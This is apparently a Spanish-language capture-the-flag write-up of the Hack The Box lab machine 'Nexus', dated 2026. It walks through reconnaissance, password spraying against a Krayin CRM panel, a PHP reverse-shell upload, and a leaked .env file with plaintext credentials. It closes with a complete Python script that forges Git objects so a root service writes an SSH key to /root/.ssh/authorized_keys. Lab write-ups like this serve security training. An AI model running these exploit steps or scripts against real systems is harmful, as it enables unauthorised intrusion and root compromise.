---
title: "Nexus Hack The Box"
date: "2026-07-02"
description: "Resolución de la máquina Nexus de Hack The Box. Enumeración de repositorios Git expuestos en Gitea, filtración de credenciales en el historial de commits (.env) y acceso inicial a Krayin CRM."
difficulty: "Easy"
tags: ["gitea", "krayin-crm", "git-history", "leak", "credentials"]
---

### 1. 📝 Planificación y Alcance

- **IP:** `10.129.234.54`
    
- **Dominio:** `nexus.htb`
    
- **Cliente:** HTB
    
- **Fecha:** 29/06/2026
    
- **Nivel:** Easy-Linux
---


## 2. 🔎 Escaneo y Enumeración

### 2.1 Escaneo de Puertos

**Comando:**


```bash
sudo nmap -sSCV -p- --open -T4 -Pn -n -vvv -oN escaneo_nmap.txt $target
```

### 2.2 Servicios Descubiertos

|**Puerto**|**Servicio**|**Versión**|
|---|---|---|
|22/tcp|SSH|OpenSSH 9.6p1 Ubuntu.|
|80/tcp|HTTP|Nginx 1.24.0|

**DOMINIO: **http://nexus.htb/

```bash
echo "10.129.234.54 nexus.htb" | sudo tee -a /etc/hosts
```

### 2.3 Enumeración Web

**Comandos fuzzing:**

Bash

```bash
#Directorios

gobuster dir -u http://$target -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x html,php,txt,js,bak -t 100 -k -r --exclude-length 49296

#Subdominios
ffuf -u http://$target -H "Host: FUZZ.TARGET.HTB" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 4 -t 200 -ac

#Scaner Web
 nuclei -target http://$target
 
#Descubrimiento de tecnologias
whatweb http://$target
```

**Actualizar /etc/hosts**

```bash
10.129.234.54 git.nexus.htb billing.nexus.htb nexus.htb
```


**Hallazgos Generales:**

```bash
#ffuf
git                     [Status: 200, Size: 14474, Words: 1195, Lines: 242, Duration: 539ms]
billing                 [Status: 302, Size: 390, Words: 60, Lines: 12, Duration: 1720ms]

http://git.nexus.htb
http://billing.nexus.htb

#Feroxbuster
http://billing.nexus.htb/admin/
http://billing.nexus.htb/storage/

#Gobuster -> http://git.nexus.htb
admin                (Status: 200) [Size: 22803]
issues               (Status: 200) [Size: 12912]
v2                   (Status: 401) [Size: 49]
robots.txt           (Status: 404) [Size: 19]
explore              (Status: 200) [Size: 18625]
milestones           (Status: 200) [Size: 12911]
notifications        (Status: 200) [Size: 12912]
jones                (Status: 200) [Size: 20221]


#Whatweb
http://nexus.htb [200 OK] Country[RESERVED][ZZ], Email[careers@nexus.htb,j.matthew@nexus.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.129.234.54], Script, Title[Nexus Energy Authority — Powering the Nation's Future], nginx[1.24.0]

http://git.nexus.htb [200 OK] Cookies[i_like_gitea], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], HttpOnly[i_like_gitea], IP[10.129.234.54], Meta-Author[Gitea - Git with a cup of tea], Open-Graph-Protocol[website], PoweredBy[Gitea], Script[module], Title[Gitea: Git with a cup of tea], X-Frame-Options[SAMEORIGIN], nginx[1.24.0]

http://billing.nexus.htb [302 Found] Cookies[XSRF-TOKEN,krayin_crm_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], HttpOnly[krayin_crm_session], IP[10.129.234.54], Meta-Refresh-Redirect[http://billing.nexus.htb/admin/login], RedirectLocation[http://billing.nexus.htb/admin/login], Title[Redirecting to http://billing.nexus.htb/admin/login], nginx[1.24.0]
http://billing.nexus.htb/admin/login [200 OK] Cookies[XSRF-TOKEN,krayin_crm_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], HttpOnly[krayin_crm_session], IP[10.129.234.54], PoweredBy[--], Script[module,text/javascript,text/x-template], Title[Sign In], UncommonHeaders[phpdebugbar-id], nginx[1.24.0]


```

**TECNOLOGIAS:**

```bash
nginx/1.24.0
http://git.nexus.htb -> Powered by Gitea Version: 1.26.0
http://billing.nexus.htb/admin/login -> Krayin CRM

#EMAILS

j.matthew@nexus.htb
careers@nexus.htb

```

**Hallazgos clave:**

```bash
http://git.nexus.htb/admin/krayin-docker-setup
```

**CAPTURAS DE PANTALLA:**


![alt text](../../../public/img/nexus4.png)

![alt text](../../../public/img/nexus6.png)

![alt text](../../../public/img/nexus5.png)


## 3. 💥 Explotación

### 3.1 Vector de Ataque

Utilizando la información recolectada, se procedió a ejecutar una técnica de _password spraying_ contra el panel de administración ubicado en `[http://billing.nexus.htb/admin/login](http://billing.nexus.htb/admin/login)`. El ataque consistió en validar la contraseña obtenida previamente frente a la lista de correos electrónicos extraídos durante la etapa de reconocimiento.

![alt text](../../../public/img/nexus1.png)

http://billing.nexus.htb/admin/dashboard

![alt text](../../../public/img/nexus2.png)

- **Servicio:** Krayin CRM
    
- **Vulnerabilidad:** Credenciales obtenidas por exposición de información sensible..
    

### 3.2 Proceso de Compromiso

*POC:*
https://github.com/TREXNEGRO/Security-Advisories/blob/main/CVE-2026-38526/poc.md

*Reverse shell PHP:*
https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php




1. **Creación del Payload:** Script `rev.php` utilicé la reverse shell de pentestmonkey.
    
2. **Ejecución:** Carga el script a través de la opción adjuntar imagen en la opción crear Email del panel de Krayin CMS
    
3. **Acceso:** Activar  `nc -nlvp 4444` y acceder a http://billing.nexus.htb/storage/tinymce/50e06b188ab1e50b6d03ae11d041cda8.php, el codigo de la ruta la encontramos en la "Response"

![alt text](../../../public/img/nexus3.png)

Estabilización de TTY: 
```bash 
script /dev/null -c /bin/bash
```



## 4. 🔑 Post-Explotación y Pivoting

### 4.1 Enumeración Local

```bash 
grep -E '/home/|/root/' /etc/passwd | cut -d: -f1
    
jones
git
```

**Encontramos una contraseña en el archivo .env**

```bash 
www-data@nexus:~/krayin$ cat .env
cat .env
APP_NAME="Krayin CRM"
APP_ENV=local
APP_KEY=base64:n4swv+4YcBtCr1OPHBe69GxK06/X1y1vCQU1SIMIC7Q=
APP_DEBUG=true
APP_URL=http://billing.nexus.htb
APP_TIMEZONE=Asia/Kolkata
APP_LOCALE=en
APP_CURRENCY=USD

VITE_HOST=
VITE_PORT=

LOG_CHANNEL=stack
LOG_LEVEL=debug

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=y27xb3ha!!74GbR
DB_PREFIX=

BROADCAST_DRIVER=log
CACHE_DRIVER=file
QUEUE_CONNECTION=sync
SESSION_DRIVER=file
SESSION_LIFETIME=120

MEMCACHED_HOST=127.0.0.1

REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379

MAIL_MAILER=smtp
MAIL_HOST=mailhog
MAIL_PORT=1025
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null
MAIL_FROM_ADDRESS=laravel@krayincrm.com
MAIL_FROM_NAME="${APP_NAME}"
MAIL_DOMAIN=webkul.com

MAIL_RECEIVER_DRIVER=sendgrid

IMAP_HOST=imap.example.com
IMAP_PORT=993
IMAP_ENCRYPTION=ssl
IMAP_VALIDATE_CERT=true
IMAP_USERNAME=your_username
IMAP_PASSWORD=your_password

AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
AWS_DEFAULT_REGION=us-east-1
AWS_BUCKET=

PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=
PUSHER_APP_CLUSTER=mt1

MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
```



### 4.2 Escalada de Privilegios

1. **Acceso SSH:** Uso de credenciales de `jones`.

[22][ssh] host: 10.129.234.54   login: jones   password: y27xb3ha!!74GbR


    

## 5. 🛡️ Escalada a Root 

**Método:** Uso de `rest-server` externo para orquestar backup del directorio `/root`.
Aprovechamiento de una vulnerabilidad de _Directory Traversal_ en el script de sincronización de plantillas de Gitea (`/etc/gitea/template-sync.py`). El atacante crea un repositorio Git configurado como "template" y utiliza un script de Python (`build.py`) para manipular manualmente los objetos Git, inyectando secuencias de recorrido de directorios (`..`) que permiten escribir archivos fuera del directorio de despliegue. Al inyectar una clave pública SSH en `/root/.ssh/authorized_keys` mediante la ejecución automatizada del servicio `gitea-template-sync.timer`, se obtiene acceso SSH con privilegios de root.


### El Concepto: Inyección de Ruta (Path Traversal)

El script `template-sync.py` clona repositorios Git y coloca sus archivos en una ruta de destino usando `os.path.join(base, archivo)`. Si `archivo` es `../../../root/.ssh/authorized_keys`, la función de Python resuelve los puntos y permite escribir en directorios fuera de la carpeta de staging.

### Paso a Paso

### 1. Acceso al Gitea y creación del Repositorio

Tras iniciar sesión en `http://git.nexus.htb/` con las credenciales de `jones` obtenidas anteriormente:

- **Crear Repositorio:** Haz clic en el botón `+` (o "New Repository").
    
- **Configuración:** * Nombre del repositorio: `rce`.
    
    - Marcado como **Template**: Debes activar la casilla "Make repository a template". Esto es vital para que el script de sincronización procese el repositorio.
        
    - Inicializar repositorio: Selecciona "Initialize Repository" (aunque esto puede variar, el objetivo es tener un repositorio base).
        
- **Crear:** Finaliza haciendo clic en "Create Repository".
    

### 2. Clonación y preparación local

Ahora debes manipular el repositorio localmente para insertar los objetos con los caracteres de recorrido (`..`) que el script `build.py` procesará.

- **Clonar el repositorio:**
    
    
    ```bash
    cd /tmp
    git clone http://jones:'y27xb3ha!!74GbR'@git.nexus.htb/jones/rce.git
    cd rce
    touch README.md
    ```
    
- **Preparar el entorno:** Asegúrate de que el script `build.py` esté en la ruta correcta y que el archivo de clave pública `/tmp/.k.pub` exista.
    
```python
#!/usr/bin/env python3
import hashlib, zlib, os, subprocess, sys, time

def write_obj(data, t):
    h = ("%s %d" % (t, len(data))).encode() + b"\x00"
    s = h + data
    sha = hashlib.sha1(s).hexdigest()
    d = os.path.join(".git", "objects", sha[:2])
    os.makedirs(d, exist_ok=True)
    p = os.path.join(d, sha[2:])
    if not os.path.exists(p):
        open(p, "wb").write(zlib.compress(s))
    return sha

def entry(mode, name, sha):
    return ("%s %s" % (mode, name)).encode() + b"\x00" + bytes.fromhex(sha)

if not os.path.isdir(".git"):
    print("Run inside git repo")
    sys.exit(1)

r = subprocess.run(["cat", "/tmp/.k.pub"], capture_output=True, text=True)
if r.returncode != 0:
    print("ssh-keygen -t ed25519 -f /tmp/.k -N ''")
    sys.exit(1)

key = r.stdout.strip() + "\n"
blob = write_obj(key.encode(), "blob")
readme = write_obj(b"# Template\n", "blob")
ssh_t = write_obj(entry("100644", "authorized_keys", blob), "tree")
cur = write_obj(entry("40000", ".ssh", ssh_t), "tree")
fir = write_obj(entry("40000", "root", cur), "tree")

for i in range(4):
    fir = write_obj(entry("40000", "..", fir), "tree")

root = write_obj(entry("100644", "README.md", readme) + entry("40000", "..", fir), "tree")
ts = int(time.time())
c = "tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n" % (root, ts, ts)
sha = write_obj(c.encode(), "commit")

os.makedirs(os.path.join(".git", "refs", "heads"), exist_ok=True)
open(os.path.join(".git", "refs", "heads", "main"), "w").write(sha + "\n")
print("Done: " + sha)
```



### 3. Ejecución del payload y sincronización

El script `build.py` crea la estructura de objetos Git "a mano", evitando las protecciones normales de `git`.

- **Ejecución:**
    
    
    
    ```bash
    python3 /tmp/build.py
    # El script mostrará: Done: 025b473292e1fdcdb027771defd8d3d0279c709f [cite: 456]
    ```
    
- **Subida forzada:** Como has modificado la estructura de objetos directamente en `.git/objects/`, debes forzar el push:
    
  
    
    ```bash
    git push -u origin main --force
    ```
    

### 4. Espera y validación

Una vez hecho el push, el servicio `gitea-template-sync.service` se activará automáticamente mediante su temporizador de 2 minutos.

- **Verificación:** Monitorea el log para confirmar que el servicio "sincronizó" la ruta maliciosa hacia `/root/.ssh/authorized_keys`:
    
  
    
    ```bash
    cat /var/log/template-sync.log
    ```
    
- **Acceso:** Si el log indica `synced: ../////root/.ssh/authorized_keys`, ya puedes acceder como root:
    

    ```bash
    ssh -i /tmp/.k root@nexus.htb
    ```
    
### Resumen de la falla técnica

El error crítico no es de Gitea en sí, sino de la **falta de saneamiento** en `template-sync.py`. Al tratar los nombres de los archivos dentro del repositorio como rutas de confianza, el programador permitió que cualquier usuario que pueda crear un repositorio controle dónde el servicio escribe archivos en el sistema. Al ejecutarse esto como un servicio del sistema, cualquier escritura se realiza con privilegios de `root`.

## 6. 🛠️ Notas Técnicas y Herramientas



### Resumen de Credenciales


- **Usuario `jones` (SSH):** `jones` : `y27xb3ha!!74GbR` (obtenidas del archivo `.env` en el repositorio Gitea `krayin-docker-setup`).
    
- **Base de Datos Krayin:** `krayin` : `y27xb3ha!!74GbR` (mismas credenciales encontradas en el archivo `.env`).
    

### Referencias


- - **CVE-2026-38526:** Vulnerabilidad en Krayin CRM (v2.2.0) utilizada para la carga de una webshell PHP y obtención de shell inicial (`www-data`).
        
        
    - **Herramientas:** `nmap` (enumeración de puertos), `ffuf` (fuzzing de subdominios), `Burp Suite` (intercepción de peticiones), `Netcat` (listener para reverse shell), `git`, `ssh-keygen`, y scripts personalizados en Python para la creación de objetos Git maliciosos.
        